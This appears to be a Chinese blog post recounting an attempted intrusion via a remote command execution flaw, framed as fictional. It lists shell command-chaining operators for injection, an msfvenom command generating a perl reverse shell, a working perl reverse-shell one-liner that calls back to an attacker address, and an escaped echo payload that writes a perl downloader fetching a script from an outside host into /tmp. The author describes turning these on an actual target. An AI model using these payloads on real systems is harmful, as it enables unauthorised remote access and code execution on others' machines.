以下内容纯属个人通过假想来一步一步进行的操作，纯属虚构

先说一下做远程命令执行那道题引发的linux下连接多个命令执行的总结：  
;（前一个命令执行成功与否，对后一个命令无影响）  
||（前一个命令失败，后一个成功，前一个成功，后一个失败）  
&&（前一个成功，后一个成功，前一个失败，后一个失败）  
|（多用于管道的符号，也能用于连接多个命令执行）  
&（多用于后台执行的符号，也能用于连接多个命令执行）  

做远程命令执行那道题，引发了我的想入非非，忍不住尝试了一下：  
目标环境：ubuntu14.04  
本地测试环境：kali2019 + ubuntu16.04  
当前用户：www-data

【0：希望的曙光】  
寻找下载功能，执行wget -V、curl -V、ftp -h，发现都被砍掉了，再次尝试python -V还是不行，直到perl -v输出了perl的版本，看到了曙光，顺便试一下ruby -v还是不行

【1：本地测试】  
perl实现下载功能的代码段：  
```
use LWP::Simple;
$name="长春";
$url="http://192.168.1.213:8080/WellsoftTest/servlet/Httpservletwell?bz=k&name=$name&index=0";
$coont =get($url);
die "not found link.." if(!defined($coont));#如果是null
open $file,">t.txt" or die "couldn't open t.txt ..\n";
print $file $coont;
print "print succeed...\n";
close($file);
print "succeed,File is t.txt, exit.....";
<>
```
经过尝试，可以下载  
msfvenom生成perl的反连shell，命令如下：  
```
msfvenom -p cmd/unix/reverse_perl lhost=xxxx lport=xxxx -o /var/www/html/x.pl
```
生成的perl一行器代码如下：  
```
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new 
IO::Socket::INET(PeerAddr,"192.168.xx.xx:xx");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
执行后报错，再次执行还是报错，修改后最终形式如下：  
```
use IO::Socket::INET;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.xx.xx:xx");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~/(.*)/){system $1;}};
```
kali下设置好监听器，成功收到反连，OK，本地测试成功，开始对实际目标攻击

2：【实际攻击】  
第一个问题就是如何生成具有下载功能的perl脚本呢？echo吧  
刚输入第一条语句
```
echo use LWP::Simple;
```
就没成功  
得了，本地测试吧，经过大量测试发现，很多特殊字符都需要转义包括;、$、"、(、)、!等符号，精简后代码如下：  
```
use LWP::Simple;
$url="http://192.168.149.130/r.pl";
$coont=get($url);
die "not found link.." if(!defined($coont));
open $file,">r.pl" or die "couldn't open t.txt ..\n";
print $file $coont;
close($file);
exit;
<>
```
将代码转换为一行形式，并全部转义，最终payload如下  
```
echo use LWP::Simple\;\$url=\"http://supplied.6655.la/r.txt\"\;\$coont=get\(\$url\)\;die \"not found link..\" if\(\!defined\(\$coont\)\)\;open \$file,\"\>r.pl\" or die \"couldn\'t open t.txt ..\\n\"\;print \$file \$coont\;close\(\$file\)\;exit\;>d.pl
```
执行如上语句，没成功  
ls -alh  #发现没有写权限  
ls -alh /  #发现当前用户在/tmp/下有写权限  
执行payload，成功在/tmp/下创建下载功能的perl代码  
执行perl /tmp/d.pl后，却没有下载用于反弹shell的perl脚本  
ifconfig发现是内网ip  
ping -c 2 网关>/tmp/a.txt  #发现能通网关  
ping -c 2 www.baidu.com>/tmp/b.txt  #发现不能通外部域名  
ping -c 2 202.98.0.68  #发现不能通外部ip

傻眼了，到此为止吧，以后再想搞的话一定要先考虑目标是否能通外网
